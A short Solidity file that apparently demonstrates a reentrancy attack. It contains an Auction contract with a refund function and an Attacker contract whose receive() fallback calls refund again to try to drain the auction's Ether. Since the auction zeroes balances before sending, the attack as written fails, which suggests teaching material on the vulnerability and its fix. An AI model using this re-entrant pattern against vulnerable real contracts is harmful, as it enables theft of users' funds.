// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol";

contract Auction is Ownable {
    uint private _bid = 1 ether;
    mapping(address => uint) private bidders;

    function doBid() external payable {
        require(msg.value >= _bid, "Bid is very small!");
        bidders[msg.sender] += msg.value;        
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

    function refund() external {
        require(bidders[msg.sender] >= _bid, "You make not bid");
        uint amount = bidders[msg.sender];
        bidders[msg.sender] = 0;    
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Failed!");
    }

    function withdraw() external onlyOwner {
        require(getBalance() > 0, "Balance is zero");
        payable(owner()).transfer(address(this).balance);
    }
}

contract Attacker is Ownable {
    uint private _bid = 1 ether;

    Auction public auction;

    constructor(address _auction)  {
        auction = Auction(_auction);
    }

    function doBidMy() external payable {
        auction.doBid{value: _bid}();
    }

    function attack() external {
        auction.refund();
    }

    function withdraw() external onlyOwner {
        require(address(this).balance > 0, "Balance is zero");
        payable(owner()).transfer(address(this).balance);
    }

    receive() external payable {
        if(auction.getBalance() >= _bid) {
            auction.refund();
        }    
    }
}

// 